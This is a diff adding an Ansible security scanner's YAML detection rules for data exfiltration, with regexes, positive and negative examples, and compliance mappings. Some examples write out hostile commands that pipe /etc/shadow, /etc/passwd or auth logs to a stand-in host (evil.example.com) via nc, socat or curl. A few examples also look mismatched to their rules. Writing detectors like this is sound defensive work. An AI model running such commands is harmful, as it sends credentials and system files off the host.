@@ -1,0 +1,426 @@
+name: "Data Exfiltration Patterns"
+author: "Ansible Security Scanner Team"
+description: "Detects patterns for collecting and exfiltrating sensitive data"
+
+patterns:
+  - id: "sensitive_file_collection"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Sensitive File Collection"
+    description: "Collecting sensitive system files that could contain secrets"
+    regex: "(?:cat|cp|tar|zip).*(?:/etc/passwd|/etc/shadow|/etc/hosts|/etc/ssh/|~/.ssh/|~/.aws/|~/.docker/)"
+    positive_examples:
+      - "command: cp /etc/passwd /tmp/passwd_copy"
+    recommendation: "Bulk-reads of /etc/passwd, /etc/shadow, ~/.ssh, ~/.aws, ~/.docker indicate credential collection; remove the task, audit for exfiltration, and source any legitimate secret from Ansible Vault or a secrets manager rather than copying host credentials off the box."
+    cwe: ['CWE-200', 'CWE-522']
+    owasp_appsec: ["A01:2021", "A04:2021"]
+    owasp_asvs: ["V2.10.1", "V6.2.1", "V8.1.1"]
+    mitre_attack: ['T1005', 'T1552.001']
+    cis_controls: ['CIS-3.3', 'CIS-Secrets']
+    nist_controls: ['AC-3', 'AC-6', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '8.6.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.3', 'CC6.7']
+
+  - id: "credential_file_search"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Credential File Search"
+    description: >-
+        find -name searches for SSH keys (id_rsa/id_dsa/id_ecdsa/id_ed25519),
+        PEM/p12/pfx files, or `credentials`/`config` filenames - the canonical
+        reconnaissance step before credential theft.
+    regex: "find.*-name.*(?:id_rsa|id_dsa|id_ecdsa|id_ed25519|\\.pem|\\.key|\\.p12|\\.pfx|credentials|config)"
+    positive_examples:
+      - |2
+            - ansible.builtin.shell: find /home -name id_rsa
+    recommendation: "find -name id_rsa / *.pem / *.key / credentials is a credential-discovery primitive; if the play actually needs to manage SSH keys, target known paths explicitly and use ansible.builtin.find with file_type and a strict pattern: list, never a recursive credential sweep."
+    cwe: ['CWE-200', 'CWE-522']
+    owasp_appsec: ["A01:2021", "A04:2021"]
+    owasp_asvs: ["V2.10.1", "V6.2.1", "V8.1.1"]
+    mitre_attack: ['T1083', 'T1552.001']
+    cis_controls: ['CIS-3.3', 'CIS-Secrets']
+    nist_controls: ['AC-3', 'AC-6', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '8.6.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.3', 'CC6.7']
+
+  - id: "environment_variable_harvesting"
+    category: "data_exfiltration"
+    severity: "MEDIUM"
+    title: "Environment Variable Harvesting"
+    description: >-
+        env|grep is filtered against PASSWORD/SECRET/TOKEN/KEY/API. The shape
+        harvests environment-resident credentials before they can be redacted from
+        process state.
+    regex: "env.*grep.*(?:PASSWORD|SECRET|TOKEN|KEY|API)"
+    positive_examples:
+      - "envgrepPASSWORD"
+    recommendation: "env | grep PASSWORD/SECRET/TOKEN/KEY/API enumerates secrets in the running process environment; remove the task, rotate any environment-injected credentials that may have been logged, and source secrets from Vault rather than process environment variables."
+    cwe: ['CWE-200', 'CWE-522']
+    owasp_appsec: ["A01:2021", "A04:2021"]
+    owasp_asvs: ["V2.10.1", "V6.2.1", "V8.1.1"]
+    mitre_attack: ['T1552.001']
+    cis_controls: ['CIS-3.3', 'CIS-Secrets']
+    nist_controls: ['AC-3', 'AC-6', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '8.6.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.3', 'CC6.7']
+
+  - id: "process_list_collection"
+    category: "data_exfiltration"
+    severity: "MEDIUM"
+    title: "Process List Collection"
+    description: "Collecting process lists that may reveal sensitive information"
+    regex: "ps\\s+aux.*grep.*(?:password|secret|token|key)"
+    positive_examples:
+      - "ps auxgreppassword"
+    recommendation: "ps aux | grep password|secret|token reads command-line credentials of other processes; remove the task and ensure callers use credential files / env-files with mode 0600 rather than passing secrets as argv."
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1057', 'T1552.001']
+    cis_controls: ['CIS-3.3']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7']
+
+  - id: "network_configuration_collection"
+    category: "data_exfiltration"
+    severity: "MEDIUM"
+    title: "Network Configuration Collection Redirected to File"
+    description: "A shell task runs a network-reconnaissance command (`netstat`, `ss`, `ip route/addr/link`, `ifconfig`, `arp`, `route`) and redirects its output into a file via `>`/`>>`. The combination - enumerate local network state + persist to a file - matches MITRE T1016 (System Network Configuration Discovery) / T1049 (System Network Connections Discovery) staging behaviour often seen in pre-exfil reconnaissance. Pure read-only invocations (`netstat -an` with no redirect) do not match."
+    # Require word-bounded binary names so ``ss`` doesn't match inside
+    # ``asset_query`` / ``response>form>`` / ``status_code`` / ``is
+    # defined`` - all real corpora shapes where the previous regex fired.
+    # Also require a filesystem target after ``>`` (not just any ``>``),
+    # so Jinja comparisons like ``count > 0`` and XML tag tails like
+    # ``form>`` are excluded. The target must look like a path (letters
+    # and ``/`` / ``.`` / ``~`` / ``$`` / backtick / a variable ref).
+    regex: "(?:(?:^|[\\s;|&])(?:netstat|ss|ifconfig|arp|route)\\b|\\bip\\s+(?:route|addr|link|neigh))\\b[^\\n]*?>>?[ \\t]*(?:['\\\"]?(?:[/~.$]|\\{\\{|\\$\\(|/dev/)|[A-Za-z][\\w./-]*\\.(?:txt|log|out|csv|json|xml|tmp|dat))"
+    positive_examples:
+      - "    shell: netstat -an > /tmp/netstat.out"
+      - "    shell: ss -tnp >> /tmp/connections.log"
+      - "    shell: ifconfig -a > /root/ifcfg.txt"
+      - "    shell: ip route > /tmp/routes.dat"
+      - "    shell: ip addr show > /tmp/addrs.txt"
+      - "    command: arp -a > ~/arp.log"
+    negative_examples:
+      - "      when: talos_asset_query.json.count > 0"
+      - "        xml_dashboard: \"{{ api_response | regex_search('<form version=[\\\\s\\\\S]*form>') }}\""
+      - "        api_response: \"{{ results.content | regex_search('<s:key name=\\\"eai:data\\\"><![\\\\s\\\\S]*form>') }}\""
+      - "      when: ansible_facts.services['falcon-sensor.service'] is defined"
+      - "        status_code: 200"
+      - |2-
+            ansible.builtin.debug:
+              msg: "count is {{ count > threshold }}"
+      - "    shell: netstat -an"
+      - "    shell: ss -tnp"
+    recommendation: "Persisting netstat / ss / ip-route output to a file is the System Network Configuration Discovery (T1016) signature; if the data is genuinely needed for operations, capture it via ansible.builtin.setup or a purpose-built fact module and store the result in the controller's fact cache rather than a host file."
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1016', 'T1049']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "log_file_collection"
+    category: "data_exfiltration"
+    severity: "MEDIUM"
+    title: "Log File Collection"
+    description: >-
+        cat/tail/head/grep targets /var/log/auth*, /var/log/secure, or
+        /var/log/messages. These files contain authentication events and PII subject
+        to GDPR/HIPAA handling rules.
+    regex: "(?:cat|tail|head|grep).*(?:/var/log/|/var/log/auth|/var/log/secure|/var/log/messages)"
+    positive_examples:
+      - "<location>/var/log/syslog</location>"
+    recommendation: "Bulk-reading /var/log/auth, /var/log/secure, /var/log/messages exfiltrates authentication history; ship logs through a vetted log-forwarder (rsyslog over TLS, journald-remote, Vector) to a central SIEM rather than copying them via ad-hoc shell tasks."
+    cwe: ['CWE-200', 'CWE-532']
+    owasp_appsec: ["A01:2021", "A09:2021"]
+    owasp_asvs: ["V7.1.1", "V8.1.1"]
+    mitre_attack: ['T1005', 'T1552.001']
+    cis_controls: ['CIS-3.3', 'CIS-8.2']
+    nist_controls: ['AC-3', 'AC-6', 'AU-2', 'AU-9', 'AU-12', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '10.2.1', '10.3.1', '10.3.2']
+    hipaa: ['164.312(a)(1)', '164.312(b)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "database_dump_creation"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Database Dump Creation"
+    description: >-
+        mysqldump/pg_dump/mongodump output is redirected to a file. Dumps
+        materialize the entire database in plaintext and need to be staged in an
+        access-controlled location, never alongside the playbook.
+    regex: "(?:mysqldump|pg_dump|mongodump).*>.*"
+    positive_examples:
+      - "su - \"$SU_USERNAME\" -c \"pg_dumpall $PGHOST --globals-only\" >> \"$2\""
+    recommendation: "Pipe mysqldump / pg_dump / mongodump output through a server-side encryption step (age, gpg --encrypt with a recipient key, openssl enc -aes-256-gcm), write to a permissioned path (mode 0600), and verify the dump's destination is controlled by the operator - not an attacker-supplied location."
+    cwe: ['CWE-200', 'CWE-522']
+    owasp_appsec: ["A01:2021", "A04:2021"]
+    owasp_asvs: ["V2.10.1", "V6.2.1", "V8.1.1"]
+    mitre_attack: ['T1005', 'T1041']
+    cis_controls: ['CIS-3.3', 'CIS-11.3']
+    nist_controls: ['AC-3', 'AC-6', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '8.6.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(iv)', '164.312(d)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.3', 'CC6.7']
+
+  - id: "archive_creation_suspicious"
+    category: "data_exfiltration"
+    severity: "MEDIUM"
+    title: "Suspicious Archive Creation"
+    description: >-
+        tar/zip/7z archives a sensitive system directory (/etc, /home, /root, /var,
+        /opt) into a single file - the staging shape used to prepare data for
+        exfiltration.
+    regex: "(?:tar|zip|7z).*(?:/etc|/home|/root|/var|/opt).*\\.(tar|tgz|zip|7z)"
+    positive_examples:
+      - "get_url: url=http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.61/bin/apache-tomcat-7.0.61.tar.gz dest=/opt/apache-tomcat-7.0.61.tar.gz"
+    recommendation: "Creating archives of /etc, /home, /root, /var, /opt is the staging step before exfiltration; if backups are intended, use a scoped backup tool (restic, borg, rsnapshot) with an encrypted off-host repository rather than ad-hoc tar/zip."
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1005', 'T1560.001']
+    cis_controls: ['CIS-3.3']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7']
+
+  - id: "remote_copy_sensitive_data"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Remote Copy of Sensitive Data"
+    description: >-
+        scp/rsync/curl -T/wget --post-file targets a path containing 'credentials',
+        'secrets', 'keys', or 'passwords'. Sensitive files should never traverse the
+        wire without encryption and scoped IAM.
+    regex: "(?:scp|rsync|curl.*-T|wget.*--post-file).*(?:credentials|secrets|keys|passwords)"
+    positive_examples:
+      - "- name: Export SCP http share all cases with HTTP proxy with credentials."
+    recommendation: "scp/rsync/curl-T of files literally named credentials/secrets/keys/passwords is exfiltration; remove the task, rotate any credentials that may have been moved, and audit destination hosts for compromise."
+    cwe: ['CWE-200', 'CWE-522']
+    owasp_appsec: ["A01:2021", "A04:2021"]
+    owasp_asvs: ["V2.10.1", "V6.2.1", "V8.1.1"]
+    mitre_attack: ['T1041', 'T1048.003']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'IA-5(7)', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '8.6.2', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(iv)', '164.312(d)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "network_data_exfiltration"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Network Data Exfiltration via Shell Pipe-To-Network"
+    description: "A shell task chains a packet-capture or file-read tool into a network-send tool - the classic exfil primitive. Matches `tcpdump -w file && curl file`, `cat file | nc host port`, `socat FILE:/path TCP:host:port`, `dd if=disk | gzip | openssl enc | curl`, and similar pipelines. MITRE T1048 (Exfiltration Over Alternative Protocol) and T1041 (Exfiltration Over C2 Channel). Pure `nc -l` listener or `socat` syslog forwarders are NOT flagged - the pipeline-to-network-egress shape is."
+    # Anchor on word-bounded binary names so ``nc`` doesn't match inside
+    # ``incomplete`` / ``unicode`` / ``dnsmasq`` / ``async``. The previous
+    # regex used bare ``nc.*<.*`` which matched every syslog packet-capture
+    # sample that happened to contain the substring ``nc`` followed much
+    # later by ``<`` anywhere. Require ``nc``/``netcat``/``ncat``/``socat``
+    # as a shell token (preceded by start-of-string, whitespace, ``;``,
+    # ``&``, ``|``, or ``$(`` - standard shell-word boundary set), and
+    # require the data-direction to look like a real network redirect:
+    #   * ``nc HOST PORT`` pattern  - literal host + numeric port token
+    #   * redirected stdin ``< FILE`` where FILE starts with ``/`` or ``~``
+    #     (a path, not arbitrary text)
+    #   * pipe INTO the binary from stdin
+    regex: "(?:(?:^|[\\s;|&])tcpdump[^\\n]*\\s-w\\s+[^\\n]+[\\s\\S]{0,200}?(?:curl|wget|nc\\b|ncat\\b|scp\\b)|(?:\\|\\s*|(?:^|[\\s;&])(?:cat|dd|gzip|bzip2|xz|openssl)\\s+[^\\n]*\\|\\s*)(?:nc|ncat|netcat|socat)\\b[^\\n]*\\s+[\\w.-]+\\s+\\d{1,5}|(?:^|[\\s;|&])(?:nc|ncat|netcat)\\b[^\\n]*\\s[\\w.-]+\\s\\d{1,5}\\s*<\\s*[/~][^\\n]+|(?:^|[\\s;|&])socat\\b[^\\n]*\\sFILE:[^\\s]+[^\\n]*\\sTCP:)"
+    multiline: true
+    positive_examples:
+      - "    shell: tcpdump -w /tmp/out.pcap && curl -T /tmp/out.pcap https://evil.example.com/u"
+      - "    shell: cat /etc/shadow | nc evil.example.com 4444"
+      - "    shell: dd if=/dev/sda | gzip | nc 10.0.0.5 9000"
+      - "    shell: nc evil.example.com 4444 < /etc/passwd"
+      - "    shell: socat FILE:/var/log/auth.log TCP:evil.example.com:9999"
+    negative_examples:
+      - "    shell: nc -l 8080"
+      - "    shell: ncat --listen --ssl 443"
+      - |2-
+            ansible.builtin.debug:
+              msg: "status is incomplete"
+      - "    events: \"<14>Sep 05 11:49:16 PA-VM ... incomplete,vsys1,untrusted,trusted,ethernet1/3\""
+      - "    shell: tcpdump -i any -c 10"
+    recommendation: "Chains like tcpdump -w -> curl, cat | nc, dd | gzip | curl are textbook exfiltration primitives (MITRE T1048); remove the task, audit egress firewall logs for the destination, and require all artefact-shipping to flow through a vetted tool with logging."
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1041', 'T1048']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "credential_grep_and_send"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Credential Grep and Send"
+    description: >-
+        grep -r searches for password/secret/key strings and pipes the output to
+        curl. The shape extracts and immediately exfiltrates any plaintext
+        credentials it finds.
+    regex: "grep.*-r.*(?:password|secret|key).*curl"
+    positive_examples:
+      - "grep-rpasswordcurl"
+    recommendation: "grep -r password|secret|key followed by curl is a search-and-exfiltrate pipeline; remove the task and audit the host. If a security scan is the actual intent, run a sanctioned secret-scanner (gitleaks, trufflehog) whose output goes to the operator, not over an outbound HTTP request."
+    cwe: ['CWE-200', 'CWE-522']
+    owasp_appsec: ["A01:2021", "A04:2021"]
+    owasp_asvs: ["V2.10.1", "V6.2.1", "V8.1.1"]
+    mitre_attack: ['T1041', 'T1552.001']
+    cis_controls: ['CIS-3.3', 'CIS-Secrets']
+    nist_controls: ['AC-3', 'AC-6', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '8.6.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.3', 'CC6.7']
+
+  - id: "rclone_data_sync"
+    category: "data_exfiltration"
+    severity: "CRITICAL"
+    title: "Rclone Cloud Data Sync"
+    description: "Uses rclone to copy or sync data to remote cloud storage, a top exfiltration tool"
+    regex: '\brclone\b\s+(?:copy|sync|move|cat|ls|lsd|mount|serve)\s+'
+    positive_examples:
+      - "rclone copy "
+    recommendation: "Rclone is the #1 data exfiltration tool used by ransomware groups; remove unless explicitly authorized"
+    no_ansible_remediation: true
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1048', 'T1567.002']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "rclone_config_setup"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Rclone Remote Configuration"
+    description: "Configures rclone remote storage backends which could be used for exfiltration"
+    regex: '\brclone\b\s+config\b|RCLONE_CONFIG_\w+_TYPE='
+    positive_examples:
+      - "rclone config"
+    recommendation: "Rclone remote configuration enables data exfiltration; ensure this is authorized"
+    no_ansible_remediation: true
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1567.002']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "mega_cmd_exfiltration"
+    category: "data_exfiltration"
+    severity: "CRITICAL"
+    title: "MEGA.nz CLI Data Transfer"
+    description: "Uses MEGAcmd tools to upload or download data to/from MEGA.nz cloud storage"
+    regex: '\bmega-(?:put|get|copy|sync|cmd|login|export)\b'
+    positive_examples:
+      - "mega-put"
+    recommendation: "MEGA.nz CLI tools can exfiltrate data to encrypted cloud storage; remove immediately"
+    no_ansible_remediation: true
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1567.002']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "azcopy_data_transfer"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "AzCopy Azure Blob Transfer"
+    description: >-
+        azcopy copy/sync/make/remove/list targets *.blob.core.windows.net. azcopy
+        bypasses Azure's audit-rich Storage SDK and is a known exfiltration tool in
+        cloud-attacker playbooks.
+    regex: '\bazcopy\b\s+(?:copy|sync|make|remove|list)\s+.*(?:blob\.core\.windows\.net|\.blob\.)'
+    positive_examples:
+      - "azcopy copy blob.core.windows.net"
+    recommendation: "AzCopy to external Azure accounts can be used for data exfiltration; verify the destination"
+    no_ansible_remediation: true
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1567.002']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "magic_wormhole_transfer"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Magic Wormhole Encrypted Transfer"
+    description: "Uses magic-wormhole to securely transfer files between computers via one-time codes"
+    regex: '\bwormhole\b\s+(?:send|receive)\b'
+    positive_examples:
+      - "wormhole send"
+    recommendation: "Magic-wormhole enables encrypted P2P file transfers that bypass network monitoring; requires approval"
+    no_ansible_remediation: true
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1567']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "croc_file_transfer"
+    category: "data_exfiltration"
+    severity: "HIGH"
+    title: "Croc Encrypted File Transfer"
+    description: "Uses croc to transfer files between computers with end-to-end encryption"
+    regex: '\bcroc\b\s+(?:send|--relay)\b'
+    positive_examples:
+      - "croc send"
+    recommendation: "Croc enables encrypted file transfers that bypass network monitoring; requires approval"
+    no_ansible_remediation: true
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1567']
+    cis_controls: ['CIS-3.3', 'CIS-13.1']
+    nist_controls: ['AC-3', 'AC-6', 'SC-28', 'SI-4']
+    pci_dss: ['3.3.1', '3.5.1', '7.2.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.3', 'CC6.7', 'CC7.2']
+
+  - id: "python_http_server_exfil"
+    category: "data_exfiltration"
+    severity: "MEDIUM"
+    title: "Python HTTP Server for File Serving"
+    description: "Runs Python's built-in HTTP server which can serve local files to remote hosts"
+    regex: 'python[23]?\s+-m\s+(?:http\.server|SimpleHTTPServer)\s*\d*'
+    positive_examples:
+      - "cmd: 'python -m http.server --directory {{url_pkg_path}} {{http_port}} >/dev/null 2>&1'"
+    recommendation: "Python HTTP server exposes local files over the network; ensure this is not serving sensitive data"
+    no_ansible_remediation: true
+    cwe: ['CWE-200']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1071.001', 'T1105']
+    cis_controls: ['CIS-4.1', 'CIS-13.1']
+    nist_controls: ['AC-3', 'CM-6', 'CM-7', 'SC-28', 'SI-4']
+    pci_dss: ['2.2.1', '2.2.4', '3.3.1', '3.5.1', '11.3.1']
+    hipaa: ['164.312(a)(1)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.7', 'CC7.1', 'CC7.2', 'CC8.1']
